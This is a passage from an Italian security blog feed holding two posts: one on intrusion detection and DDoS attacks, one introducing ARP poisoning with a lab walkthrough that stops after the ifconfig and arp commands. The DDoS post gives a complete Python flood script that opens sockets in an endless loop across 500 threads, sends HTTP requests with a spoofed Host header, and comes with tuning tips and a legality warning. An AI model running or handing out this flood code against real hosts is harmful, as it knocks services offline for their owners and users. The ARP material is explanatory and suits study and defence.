&lt;p&gt;&lt;strong&gt;Network Based IDS (NIDS) guardano gli attacchi nel traffico di rete&lt;/strong&gt;: essi utilizzano I pacchetti di rete come sorgente e sono tipicamente degli adattatori i rete in modalità promiscua. Riconoscono gli attacchi sulla base di:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pattern o espressioni;&lt;/li&gt;
&lt;li&gt;frequenza di rilevazione (es port scanning);&lt;/li&gt;
&lt;li&gt;correlazione di eventi poco frequenti.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Host-based IDS (HIDS) guardano gli attacchi negli host&lt;/strong&gt;: tipicamente sono sistemi di monitoraggio eventi e log di sicurezza. Verificare il checksum dei file di sistema e eseguibili. Alcuni prodotti ascoltano l’attività delle porte e avvisano se ci sono accessi.&lt;/p&gt;
&lt;p&gt;I semplici attacchi DoS sono ormai in disuso, in quanto decisamente meno performanti rispetto ad un attacco di negazione del servizio distribuito.&lt;/p&gt;
&lt;p&gt;Ora che abbiamo dato una panoramica generiale comprendiamo cos&amp;rsquo;è un attacco DDoS.&lt;/p&gt;
&lt;h1 id=&#34;cosè-un-attacco-denial-of-service&#34;&gt;Cos&amp;rsquo;è un Attacco Denial of Service&lt;/h1&gt;
&lt;p&gt;Un attacco di tipo Distributed Denial of Service (DDoS) è un&amp;rsquo;arma di sicurezza informatica che mira a interrompere le attività aziendali o estorcere denaro alle organizzazioni prese di mira. Le motivazioni di questi attacchi possono essere legate a ragioni di carattere politico, religioso, competitivo o di profitto finanziario. Un attacco DDoS è tecnicamente la versione distribuita del Denial of Service (DoS), che ha lo scopo di interrompere i servizi di un’azienda. I malintenzionati utilizzano enormi volumi di traffico per sovraccaricare i normali carichi di lavoro, server o interconnessioni di rete per renderli inutilizzabili. Se l’effetto degli attacchi DoS è quello di interrompere un servizio, gli attacchi distribuiti (DDoS) vengono invece eseguiti su scala molto più estesa, con il conseguente arresto di intere infrastrutture e servizi scalabili (servizi Cloud).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Nell&amp;rsquo;agosto 2020, la Borsa neozelandese è stata vittima di un attacco DDoS volumetrico che ha interrotto il servizio per tre giorni consecutivi causando la perdita di milioni di dollari.&lt;/li&gt;
&lt;li&gt;Nel febbraio 2020, un hyperscaler globale ha segnalato un attacco alla propria infrastruttura con 2,3 Tbps di traffico malevolo e 20,6 milioni di richieste al secondo.&lt;/li&gt;
&lt;li&gt;Nei mesi di febbraio e marzo 2018, diverse aziende hanno segnalato un nuovo vettore di attacco basato su una vulnerabilità di memcached che utilizzava tecniche di amplificazione e riflessione. OVHcloud ha osservato e filtrato attacchi con dimensioni fino a 1,3 Tbps.&lt;/li&gt;
&lt;li&gt;Nell&amp;rsquo;ottobre 2016, un attacco informatico di tipo Dyn DDoS ha causato l&amp;rsquo;interruzione dei principali servizi Internet con una serie di attacchi DDoS mirati a sistemi gestiti dal provider DNS Dyn.&lt;/li&gt;
&lt;li&gt;Nel settembre 2016 la botnet Mirai, composta da oltre 600.000 dispositivi IoT compromessi (come le telecamere), è stata utilizzata contro una nota pagina di notizie sulla sicurezza, Krebs on Security. Questo attacco ha colpito la vittima con ben 620 Gbps di traffico durante il suo picco maggiore. Contemporaneamente, OVHcloud ha segnalato un attacco di oltre 1 Tbps.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tipi-di-attacco-ddos&#34;&gt;Tipi di attacco DDoS&lt;/h2&gt;
&lt;h3 id=&#34;attacchi-volumetrici&#34;&gt;Attacchi volumetrici&lt;/h3&gt;
&lt;p&gt;Gli &lt;strong&gt;attacchi DDoS volumetrici&lt;/strong&gt; sono i più diffusi. L&amp;rsquo;intento di un attacco di questo tipo è quello di rendere server, servizi o infrastrutture irraggiungibili, inondando con enormi quantità di richieste. In questo modo, la connessione di rete o le risorse risultano sature: gli utenti legittimi non riescono ad accedere ai servizi e i server non sono più in grado di gestire i flussi di traffico né di rispondere alle richieste. Le macchine compromesse (o altri dispositivi connessi come IoT e videocamere), chiamati botnet, possono essere utilizzati dagli hacker per rendere un attacco più distribuito e quindi efficace. Una delle tecniche più utilizzate dagli hacker è quella di inviare da un indirizzo IP falsificato (IP spoofing) grandi quantità di pacchetti di piccole dimensioni alle botnet, che a loro volta rispondono con pacchetti più grandi direttamente alla vittima (all&amp;rsquo;IP falsificato). I bersagli colpiti da questa quantità imprevista di traffico solitamente non sono in grado di rispondere alle richieste e le loro connessioni Internet sono completamente congestionate dal traffico dannoso che occupa tutta la banda disponibile. Questa tecnica è chiamata attacco di riflessione e amplificazione.&lt;/p&gt;
&lt;h3 id=&#34;attacchi-ai-protocolli&#34;&gt;Attacchi ai protocolli&lt;/h3&gt;
&lt;p&gt;Questi tipi di attacco colpiscono i protocolli utilizzati per la comunicazione di rete e sfruttano le vulnerabilità per rendere indisponibili i server o i servizi della vittima. Questo scenario in alcuni casi può portare al sovraccarico dei dispositivi che collegano questi servizi a Internet. Un esempio di attacco basato sui protocolli è lo Smurf DDoS, un Denial of Service distribuito a livello di rete. Un pacchetto inviato da un hacker a un indirizzo di rete broadcast genera una risposta automatica da parte di ogni host. Utilizzando questo metodo e falsificando l’IP sorgente (spoofing), gli aggressori possono deviare un gran numero di risposte e sommergere una vittima con il traffico. Con la giusta quantità di risposte ICMP, un bersaglio può essere tenuto offline.&lt;/p&gt;
&lt;h3 id=&#34;attacchi-a-livello-di-applicazione-l7&#34;&gt;Attacchi a livello di applicazione (L7)&lt;/h3&gt;
&lt;p&gt;Le applicazioni implementano la logica più avanzata e sono generalmente quelle che utilizzano una quantità maggiore di risorse, le più specifiche e probabilmente le meno testate. Queste caratteristiche le rendono un bersaglio perfetto per un attacco. I metodi di attacco sferrati a questo livello di solito richiedono una minima quantità di risorse e, per la maggior parte, possono passare inosservati ai firewall e ai sistemi di protezione DoS generali. Un esempio è un attacco a un server game (come i server Minecraft) che rende un gioco inaffidabile, con molte intermittenze, giocatori che perdono la connessione o causano anche downtime. Questo rende i server game inutilizzabili, quindi la piattaforma perde il suo rank e l&amp;rsquo;immagine del proprietario ne risulta danneggiata, con la conseguente perdita di giocatori e soldi. Per difendersi al meglio da questi tipi di attacco è necessaria una buona comprensione della logica delle applicazioni e dei suoi utilizzi specifici.&lt;/p&gt;
&lt;h1 id=&#34;come-realizzare-uno-script-per-il-ddos&#34;&gt;Come realizzare uno script per il DDoS&lt;/h1&gt;
&lt;p&gt;L&amp;rsquo;implementazione di uno script DDOS in Python è abbastanza semplice.&lt;/p&gt;
&lt;p&gt;Abbiamo solo bisogno di inviare richieste a un host su una porta specifica più e più volte. Questo può essere fatto con i sockets. Per accelerare il processo e renderlo più efficace, utilizzeremo anche il multi-threading. Quindi, saranno necessarie le seguenti librerie:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; threading
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora la prima cosa di cui abbiamo bisogno sono l&amp;rsquo;indirizzo IP del bersaglio, la porta che vogliamo attaccare e il nostro falso indirizzo IP che vogliamo usare. Nota che questo tipo di indirizzo IP &amp;ldquo;falso&amp;rdquo; non nasconde realmente chi sei. Non ti rende anonimo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;10.0.0.138&amp;#39;&lt;/span&gt;
fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;182.21.20.32&amp;#39;&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Come ho già detto, DDOS è illegale. Quindi fai attenzione al bersaglio che scegli qui. In questo caso, ho scelto l&amp;rsquo;indirizzo IP del mio router di casa. Puoi anche scegliere il tuo server di casa, la tua stampante o forse anche il tuo sito web. Se non conosci il tuo indirizzo IP, puoi utilizzare la riga di comando e eseguire il ping del dominio per ottenerlo. Come indirizzo IP falso ho scelto un indirizzo casuale ma ancora valido. Ultimo ma non meno importante, ho deciso di attaccare la porta 80, che è HTTP. Se vuoi chiudere un servizio specifico, devi sapere su quale porta sta operando. La prossima cosa che dobbiamo fare è implementare l&amp;rsquo;effettiva funzione di attacco.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((target, port))
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; target &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HTTP/1.1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questa funzione di attacco è la funzione che verrà eseguita in ciascuno dei nostri singoli thread. Avvia un ciclo infinito, all&amp;rsquo;interno del quale crea un socket, si connette al target e invia una richiesta HTTP più e più volte. Ovviamente, se stai attaccando un&amp;rsquo;altra porta, dovrai anche cambiare il tipo di richiesta che invii.&lt;/p&gt;
&lt;p&gt;Qui puoi vedere che stiamo inserendo il nostro falso indirizzo IP nella richiesta. La richiesta stessa deve essere codificata in byte, in modo che possa essere inviata al server. Alla fine di ogni iterazione, chiudiamo il nostro socket.&lt;/p&gt;
&lt;p&gt;Ora l&amp;rsquo;ultima cosa che dobbiamo fare è eseguire più thread che eseguono questa funzione contemporaneamente. Se eseguissimo semplicemente la funzione, invierebbe molte richieste più e più volte, ma sarebbe sempre solo una dopo l&amp;rsquo;altra. Utilizzando il multithreading, possiamo inviare molte richieste contemporaneamente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;):
    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;attack)
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo caso, stiamo avviando 500 thread che eseguiranno la nostra funzione. Certo, puoi giocare con il numero. Forse 30 o 50 sono già sufficienti. Quando ora eseguiamo il nostro script, eseguiremo il DDOS sull&amp;rsquo;obiettivo ma non vedremo nulla. Se vuoi vedere alcune informazioni, puoi stampare gli importi delle richieste già inviate.&lt;/p&gt;
&lt;p&gt;Basta notare che questo rallenterà il tuo attacco.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;attack_num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((target, port))
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; target &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HTTP/1.1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
        
        &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; attack_num
        attack_num &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print(attack_num)
        
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Abbiamo creato una variabile attack_num che tiene traccia di quante richieste sono già state inviate. Ad ogni iterazione, aumentiamo questo numero e lo stampiamo.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Introduzione All&#39;ARP Poisoning</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/</guid>
      <description>Table Of Contents:
 Cos&amp;rsquo;è il Protocollo ARP Che cos’è l’ARP Poisoning ARP Poisoning con Scapy e Python Come prevenire L&amp;rsquo;ARP Poisoning con DAI   In questi giorni ho letto Python per Hacker (seconda edizione) e mi sono imbattuto durante la lettura in un argomento molto interessante, ossia l&amp;rsquo;ARP Poisoning.
Ho iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.
Cos&amp;rsquo;è il Protocollo ARP Per approfondire l&amp;rsquo;argomento ti consigli di leggere questo.</description>
      <content>&lt;p&gt;&lt;strong&gt;Table Of Contents&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#cos---il-protocollo-arp&#34;&gt;Cos&amp;rsquo;è il Protocollo ARP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#che-cos---l-arp-poisoning&#34;&gt;Che cos’è l’ARP Poisoning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#arp-poisoning-con-scapy-e-python&#34;&gt;ARP Poisoning con Scapy e Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#come-prevenire-l-arp-poisoning-con-dai&#34;&gt;Come prevenire L&amp;rsquo;ARP Poisoning con DAI&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;In questi giorni ho letto &lt;em&gt;Python per Hacker (seconda edizione)&lt;/em&gt; e mi sono imbattuto durante la lettura in un argomento
molto interessante, ossia &lt;strong&gt;l&amp;rsquo;ARP Poisoning&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Ho iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.&lt;/p&gt;
&lt;h1 id=&#34;cosè-il-protocollo-arp&#34;&gt;Cos&amp;rsquo;è il Protocollo ARP&lt;/h1&gt;
&lt;p&gt;Per approfondire l&amp;rsquo;argomento ti consigli di leggere &lt;a href=&#34;https://www.ionos.it/digitalguide/server/sicurezza/arp-poisoning-attacchi-dalla-rete-locale/&#34;&gt;questo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A differenza di quanto succede su Internet, i dispositivi presenti nella LAN non comunicano direttamente attraverso gli indirizzi IP, al loro posto, per l’indirizzamento nelle reti locali IPv4, vengono utilizzati gli indirizzi fisici dell’hardware, chiamati indirizzi MAC (Media Access Control). Gli indirizzi MAC vengono attribuiti dal rispettivo produttore hardware e sono unici al mondo. Teoricamente gli indirizzi hardware si adatterebbero quindi per consentire un indirizzamento globale, ma nella prassi questa concezione non si può applicare, visto che gli indirizzi IPv4 sono troppo brevi per rappresentare in modo completo gli indirizzi MAC. Nelle reti basate su IPv4, la risoluzione dell’indirizzo tramite ARP è perciò indispensabile.&lt;/p&gt;
&lt;p&gt;Se ora un computer A volesse contattare un computer B nella stessa rete, per ottenere il suo indirizzo IP deve prima di tutto individuare l’indirizzo MAC appropriato. Così entra in azione l’Address Resolution Protocol (ARP), un protocollo di rete che funziona secondo lo schema request-response. Ricercando l’indirizzo MAC giusto, il computer A invia prima di tutto una richiesta broadcast (chiamata richiesta ARP, in inglese “ARP request”) a tutti i dispositivi in rete, questa richiesta comprende all’incirca le seguenti informazioni:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Un computer con l&amp;rsquo;indirizzo MAC xx-xx-xx-xx-xx-xx e l&amp;rsquo;indirizzo IP yyy.yyy.yyy.yyy vorrebbe prendere contatto con un computer con l&amp;rsquo;indirizzo IP zzz.zzz.zzz.zzz e ha bisogno dell&amp;rsquo;indirizzo MAC giusto.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;La richiesta ARP viene accolta da tutti i computer nella LAN. Ogni computer in rete è collegato a una tabella locale, detta cache ARP, per evitare che prima dell’invio di ogni pacchetto debba venire fatta una richiesta ARP. Qui vengono salvati temporaneamente tutti gli indirizzi MAC conosciuti, comprensivi dell’IP assegnato.&lt;/p&gt;
&lt;p&gt;Tutti i computer nella rete annotano così nella richiesta broadcast la coppia di indirizzo del mittente consegnato. Però ci si aspetta una risposta broadcast solo dal computer B, che invia un’ARP reply comprendente le seguenti informazioni:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Qui il sistema con l&amp;rsquo;indirizzo IP zzz.zzz.zzz.zzz. L&amp;rsquo;indirizzo MAC ricercato è aa-aa-aa-aa-aa-aa.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Se un’ARP reply giunge al computer A, questo dispone di tutte le informazioni necessarie per inviare i pacchetti al computer B. Perciò la comunicazione attraverso la rete locale non incontra nessun ostacolo.&lt;/p&gt;
&lt;p&gt;Ma cosa succede se non è il computer di destinazione ricercato a rispondere, bensì un altro dispositivo che viene controllato da un hacker con intenti poco onorevoli? In questo caso entra in gioco l’ARP poisoning.&lt;/p&gt;
&lt;p&gt;Ora che abbiamo chiarito il funzionamento del protocollo ARP, possiamo capire come un attaccante può usare le falle del protocollo per i suoi scopi.&lt;/p&gt;
&lt;h1 id=&#34;che-cosè-larp-poisoning&#34;&gt;Che cos’è l’ARP Poisoning&lt;/h1&gt;
&lt;p&gt;Lo schema request-response del protocollo ARP è creato in modo tale che venga accettata e salvata la prima richiesta a un ARP request. Nel campo dell’ARP spoofing, gli hacker cercano perciò di prevenire il reale computer di destinazione, di inviare un pacchetto di risposta con informazioni false e di manipolare così la tabella ARP del computer richiedente, si parla quindi anche di ARP poisoning, perché si intende un “avvelenamento” della cache ARP. Di solito il pacchetto comprende anche l’indirizzo MAC di un dispositivo di rete, controllato dall’hacker. Il sistema della vittima collega così l’IP di uscita con un indirizzo dell’hardware falso e in seguito invia, inosservato, tutti i pacchetti al sistema controllato dall’hacker, che ha così la possibilità di rilevare tutto il traffico dati o di manipolarlo. Per rimanere nascosto, il traffico dati ascoltato viene solitamente inoltrato al sistema di destinazione reale. Un hacker ottiene così con l’inganno lo status di man in the middle. Se i pacchetti intercettati non vengono inoltrati, bensì rifiutati, l’ARP poisoning può comportare un Denial of Service (DoS). Un’altra strategia prevede che la rete venga continuamente bombardata da ARP reply false. La maggior parte dei sistemi ignorano i pacchetti di risposta che non possono attribuire a nessuna richiesta; però questo cambia non appena un computer avvia nella LAN una richiesta ARP e di conseguenza si ha l’intenzione di accettare una risposta.
È quindi una questione di timing, se al mittente arrivi prima la risposta del sistema di destinazione o di uno dei pacchetti falsi.&lt;/p&gt;
&lt;h1 id=&#34;arp-poisoning-con-scapy-e-python&#34;&gt;ARP Poisoning con Scapy e Python&lt;/h1&gt;
&lt;p&gt;Dopo tutta questa prefazione teorica ora dobbiamo mettere le mani in pasta.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Disclaimer: ⚠️ Quello che starete per vedere è un esempio di attacco informatico che sto svolgendo su sistemi di mia proprietà. Per chi fosse curioso di replicare quanto vede, consigli di farlo su sistemi di suo possesso, usare queste tecniche su sistemi informatici senza autorizzazione è un illecito. ⚠️&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Per questo attacco useremo una macchina Kali (macchina attaccante) e una macchina Pop-os (macchina target - vittima), rispettivamente su macchina virtuale e sul portatile.&lt;/p&gt;
&lt;p&gt;Per prima cosa controlleremo la configurazione di rete su Pop-os, il nostro bersaglio. Usiamo il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ifconfig &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;interface&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;interface&lt;/em&gt; dovrà essere sostituito con il nome dell’interfaccia di rete della macchina vittima, nel mio caso l’interfaccia è wlp61s0, l’output dovrà essere un qualcosa simile a:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wlp61s0: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1500&lt;/span&gt;
        inet 192.168.1.22  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::bf57:5b8e:8ef6:fe0b  prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;  scopeid 0x20&amp;lt;link&amp;gt;
        ether b4:6b:fc:a3:63:99  txqueuelen &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ethernet&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
        RX packets &lt;span style=&#34;color:#ae81ff&#34;&gt;190150&lt;/span&gt;  bytes &lt;span style=&#34;color:#ae81ff&#34;&gt;230866258&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;230.8 MB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
        RX errors &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  dropped &lt;span style=&#34;color:#ae81ff&#34;&gt;2237&lt;/span&gt;  overruns &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  frame &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        TX packets &lt;span style=&#34;color:#ae81ff&#34;&gt;52365&lt;/span&gt;  bytes &lt;span style=&#34;color:#ae81ff&#34;&gt;14313727&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;14.3 MB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
        TX errors &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  dropped &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; overruns &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  carrier &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  collisions &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il comando ifconfig ci mostra la configurazione della rete per un’interfaccia specifica (in quest’esempio è la wlp61s0) o per tutte le interfacce se non ne richiediamo una in particolare.&lt;/p&gt;
&lt;p&gt;L’output mostra che l’indirizzo &lt;strong&gt;inet&lt;/strong&gt; (IPv4) per il dispositivo è 192.168.1.22. È mostrato anche l’indirizzo mac ether che è b4:6b:fc:a3:63:99.&lt;/p&gt;
&lt;p&gt;Ora vediamo la cache ARP della macchina vittima, usiamo il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;arp -a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il risultato è qualcosa del tipo:&lt;/p&gt;
